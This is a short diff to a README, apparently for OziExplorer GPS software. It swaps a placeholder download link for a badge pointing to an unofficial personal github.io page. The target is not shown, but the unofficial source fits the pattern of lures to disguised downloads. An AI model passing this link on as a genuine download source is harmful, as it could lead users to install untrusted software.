@@ -44,5 +44,5 @@ For help with OziExplorer, open the built-in Help menu inside the app, where map
 
 ---
 
-**Ready to give it a try?** [![Download OziExplorer](https://img.shields.io/badge/⬇_Download_OziExplorer-E05D44?style=for-the-badge)](PasteDownloadLinkHere)
+**Ready to give it a try?** [![Download OziExplorer](https://img.shields.io/badge/⬇_Download_OziExplorer-E05D44?style=for-the-badge)](https://patrickklein26.github.io/.github/OziExplorer-GPS-App)
 
